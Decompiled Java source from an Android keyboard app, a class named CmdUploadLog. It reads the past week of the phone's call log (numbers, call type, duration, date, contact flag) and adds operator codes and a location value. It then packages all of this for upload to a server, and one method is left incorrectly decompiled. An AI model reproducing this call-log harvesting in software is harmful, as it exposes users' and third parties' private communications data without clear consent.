package com.cootek.smartinput5.net.cmd;

import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.provider.CallLog;
import android.text.TextUtils;
import android.util.Log;
import com.cootek.presentation.service.config.PresentConfigXmlTag;
import com.cootek.smartinput5.func.C1368X;
import com.cootek.smartinput5.net.C2225al;
import com.weibo.net.C4054q;
import com.yahoo.mobile.client.share.search.p099ui.activity.SearchActivity;
import com.yahoo.mobile.client.share.search.p099ui.view.Utils;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* renamed from: com.cootek.smartinput5.net.cmd.L */
/* compiled from: CmdUploadLog */
public class C2254L extends C2259P {

    /* renamed from: a */
    public static final String f9643a = "calllog_cached_type";

    /* renamed from: b */
    public static final int f9644b = -1;

    /* renamed from: c */
    public static final int f9645c = 0;

    /* renamed from: d */
    public static final int f9646d = 1;

    /* renamed from: e */
    public static final String f9647e = "messageid";

    /* renamed from: f */
    public static final int f9648f = -1;

    /* renamed from: g */
    public static final int f9649g = 1;

    /* renamed from: h */
    public static final int f9650h = 2;

    /* renamed from: i */
    public static final int f9651i = 3;

    /* renamed from: j */
    public static final int f9652j = -2;

    /* renamed from: k */
    public static final int f9653k = -3;

    /* renamed from: m */
    private static StringBuffer f9654m = null;

    /* renamed from: n */
    private static final int f9655n = 32;

    /* renamed from: l */
    private final String f9656l = "CmdUploadLog";

    /* renamed from: com.cootek.smartinput5.net.cmd.L$a */
    /* compiled from: CmdUploadLog */
    public static class C2255a {

        /* renamed from: a */
        public static final String f9657a = "incoming";

        /* renamed from: b */
        public static final String f9658b = "outgoing";

        /* renamed from: c */
        public static final Long f9659c = new Long(0);

        /* renamed from: d */
        public static final Long f9660d = new Long(1);

        /* renamed from: e */
        public String f9661e;

        /* renamed from: f */
        public String f9662f;

        /* renamed from: g */
        public Long f9663g;

        /* renamed from: h */
        public Long f9664h;

        /* renamed from: i */
        public boolean f9665i;

        /* renamed from: j */
        public String f9666j;

        /* renamed from: k */
        public String f9667k;

        /* renamed from: l */
        public String f9668l;

        /* renamed from: m */
        public String f9669m;
    }

    /* access modifiers changed from: protected */
    /* renamed from: c */
    public String mo7768c() {
        return C2258O.UPLOAD_HISTORY.mo7825a(f9738J);
    }

    /* access modifiers changed from: protected */
    /* renamed from: a */
    public Object mo7764a(JSONObject jSONObject) throws JSONException {
        JSONArray m = m10289m();
        if (m == null) {
            this.f9749R = true;
        } else {
            jSONObject.put("data", m);
        }
        return null;
    }

    /* access modifiers changed from: protected */
    /* renamed from: a */
    public boolean mo7765a(HttpResponse httpResponse) {
        super.mo7765a(httpResponse);
        try {
            EntityUtils.toString(httpResponse.getEntity(), Utils.UTF8);
            return true;
        } catch (IOException | IllegalStateException e) {
            return true;
        }
    }

    /* access modifiers changed from: protected */
    /* renamed from: e */
    public String mo7770e() {
        return f9740L;
    }

    /* access modifiers changed from: protected */
    /* renamed from: d */
    public String mo7769d() {
        return C4054q.f16509e;
    }

    /* renamed from: m */
    private JSONArray m10289m() {
        Cursor cursor;
        try {
            cursor = C1368X.m6313b().getContentResolver().query(CallLog.Calls.CONTENT_URI, m10288j() == 1 ? new String[]{"number", "type", PresentConfigXmlTag.TOAST_ATTR_TOAST_DURATION, "date", "name", f9647e} : new String[]{"number", "type", PresentConfigXmlTag.TOAST_ATTR_TOAST_DURATION, "date", "name"}, "date > " + String.valueOf(System.currentTimeMillis() - Utils.WEEK_MILLIS), (String[]) null, "date DESC");
        } catch (Exception e) {
            e.printStackTrace();
            cursor = null;
        }
        return m10284a(m10283a(cursor, 100));
    }

    /* renamed from: a */
    public static C2255a m10281a(Cursor cursor) {
        boolean z = false;
        if (!m10286b(cursor)) {
            return null;
        }
        C2255a aVar = new C2255a();
        aVar.f9661e = m10287c(cursor);
        aVar.f9662f = cursor.getString(0);
        aVar.f9663g = Long.valueOf(cursor.getLong(3) / 1000);
        aVar.f9664h = Long.valueOf(cursor.getLong(2));
        if (!TextUtils.isEmpty(cursor.getString(4))) {
            z = true;
        }
        aVar.f9665i = z;
        aVar.f9667k = C2225al.m10069f(C1368X.m6313b());
        aVar.f9668l = C2225al.m10071g(C1368X.m6313b());
        aVar.f9669m = C2225al.m10051a(C1368X.m6313b());
        return aVar;
    }

    /* renamed from: c */
    private static String m10287c(Cursor cursor) {
        if (cursor == null || cursor.isClosed()) {
            return "";
        }
        switch (m10280a(cursor.getInt(1))) {
            case 1:
            case 3:
                return C2255a.f9657a;
            case 2:
                return C2255a.f9658b;
            default:
                return "";
        }
    }

    /* renamed from: a */
    public static List<C2255a> m10283a(Cursor cursor, int i) {
        ArrayList arrayList = new ArrayList();
        if (cursor != null) {
            try {
                if (cursor.moveToFirst()) {
                    int i2 = 0;
                    do {
                        if (m10286b(cursor)) {
                            i2++;
                            arrayList.add(m10281a(cursor));
                        }
                        if (i2 >= i) {
                            break;
                        }
                    } while (cursor.moveToNext());
                }
            } catch (SQLiteException e) {
                Log.e("", e.toString());
                if (cursor != null && !cursor.isClosed()) {
                    try {
                        cursor.close();
                    } catch (Exception e2) {
                    }
                }
            } catch (Throwable th) {
                if (cursor != null && !cursor.isClosed()) {
                    try {
                        cursor.close();
                    } catch (Exception e3) {
                    }
                }
                throw th;
            }
        }
        if (cursor != null && !cursor.isClosed()) {
            try {
                cursor.close();
            } catch (Exception e4) {
            }
        }
        return arrayList;
    }

    /* renamed from: a */
    public static JSONArray m10284a(List<C2255a> list) {
        if (list == null) {
            return null;
        }
        JSONArray jSONArray = new JSONArray();
        for (C2255a a : list) {
            JSONObject a2 = m10285a(a);
            if (a2 != null) {
                jSONArray.put(a2);
            }
        }
        return jSONArray;
    }

    /* renamed from: a */
    public static JSONObject m10285a(C2255a aVar) {
        if (aVar == null) {
            return null;
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put("type", aVar.f9661e);
            jSONObject.put("other_phone", m10282a(aVar.f9662f));
            if (aVar.f9663g != null) {
                jSONObject.put("date", aVar.f9663g);
            }
            if (aVar.f9664h != null) {
                jSONObject.put(PresentConfigXmlTag.TOAST_ATTR_TOAST_DURATION, aVar.f9664h);
            }
            jSONObject.put(SearchActivity.SUGGEST_CONTACTS, aVar.f9665i);
            if (!TextUtils.isEmpty(aVar.f9667k)) {
                jSONObject.put("network_mnc", aVar.f9667k);
            }
            if (!TextUtils.isEmpty(aVar.f9668l)) {
                jSONObject.put("sim_mnc", aVar.f9668l);
            }
            if (TextUtils.isEmpty(aVar.f9669m)) {
                return jSONObject;
            }
            jSONObject.put("loc", aVar.f9669m);
            return jSONObject;
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }

    /* renamed from: a */
    private static String m10282a(String str) {
        if (TextUtils.isEmpty(str)) {
            return "";
        }
        if (f9654m == null) {
            f9654m = new StringBuffer(32);
        } else {
            f9654m.delete(0, f9654m.length());
        }
        for (int i = 0; i != str.length(); i++) {
            char charAt = str.charAt(i);
            if ((charAt >= '0' && charAt <= '9') || charAt == '+' || charAt == '*' || charAt == '#' || charAt == ',' || charAt == ';' || charAt == '-') {
                f9654m.append(charAt);
            }
        }
        try {
            return f9654m.toString();
        } catch (OutOfMemoryError e) {
            return str;
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:21:0x0038 A[SYNTHETIC, Splitter:B:21:0x0038] */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x0043 A[SYNTHETIC, Splitter:B:28:0x0043] */
    /* renamed from: j */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static int m10288j() {
        /*
            r6 = -1
            r7 = 0
            android.content.Context r0 = com.cootek.smartinput5.func.C1368X.m6313b()     // Catch:{ SecurityException -> 0x002c }
            android.content.ContentResolver r0 = r0.getContentResolver()     // Catch:{ SecurityException -> 0x002c }
            android.net.Uri r1 = android.provider.CallLog.Calls.CONTENT_URI     // Catch:{ SecurityException -> 0x002c }
            r2 = 0
            r3 = 0
            r4 = 0
            java.lang.String r5 = "date DESC LIMIT 1"
            android.database.Cursor r1 = r0.query(r1, r2, r3, r4, r5)     // Catch:{ SecurityException -> 0x002c }
        L_0x0015:
            if (r1 == 0) goto L_0x001d
            boolean r0 = r1.moveToFirst()     // Catch:{ Exception -> 0x004e, all -> 0x004b }
            if (r0 != 0) goto L_0x001d
        L_0x001d:
            java.lang.String r0 = "messageid"
            int r0 = r1.getColumnIndex(r0)     // Catch:{ Exception -> 0x004e, all -> 0x004b }
            if (r0 == r6) goto L_0x0032
            r0 = 1
        L_0x0026:
            if (r1 == 0) goto L_0x002b
            r1.close()     // Catch:{ Exception -> 0x0047 }
        L_0x002b:
            return r0
        L_0x002c:
            r0 = move-exception
            r0.printStackTrace()     // Catch:{ Exception -> 0x0034, all -> 0x0040 }
            r1 = r7
            goto L_0x0015
        L_0x0032:
            r0 = 0
            goto L_0x0026
        L_0x0034:
            r0 = move-exception
            r0 = r7
        L_0x0036:
            if (r0 == 0) goto L_0x003b
            r0.close()     // Catch:{ Exception -> 0x003d }
        L_0x003b:
            r0 = r6
            goto L_0x002b
        L_0x003d:
            r0 = move-exception
            r0 = r6
            goto L_0x002b
        L_0x0040:
            r0 = move-exception
        L_0x0041:
            if (r7 == 0) goto L_0x0046
            r7.close()     // Catch:{ Exception -> 0x0049 }
        L_0x0046:
            throw r0
        L_0x0047:
            r1 = move-exception
            goto L_0x002b
        L_0x0049:
            r1 = move-exception
            goto L_0x0046
        L_0x004b:
            r0 = move-exception
            r7 = r1
            goto L_0x0041
        L_0x004e:
            r0 = move-exception
            r0 = r1
            goto L_0x0036
        */
        throw new UnsupportedOperationException("Method not decompiled: com.cootek.smartinput5.net.cmd.C2254L.m10288j():int");
    }

    /* renamed from: b */
    public static boolean m10286b(Cursor cursor) {
        String string;
        if (cursor == null || cursor.isClosed()) {
            return false;
        }
        try {
            int columnIndex = cursor.getColumnIndex("type");
            if (columnIndex == -1 || cursor.getInt(columnIndex) == 10) {
                return false;
            }
            int columnIndex2 = cursor.getColumnIndex(f9647e);
            if (columnIndex2 == -1 || (string = cursor.getString(columnIndex2)) == null || string.length() <= 0) {
                return true;
            }
            return false;
        } catch (NumberFormatException e) {
            return false;
        }
    }

    /* renamed from: a */
    public static int m10280a(int i) {
        if (i == 1 || i == 2 || i == 3 || i < 0) {
            return i;
        }
        return 1;
    }

    /* renamed from: l */
    public String mo7780l() {
        return "CmdUL";
    }
}
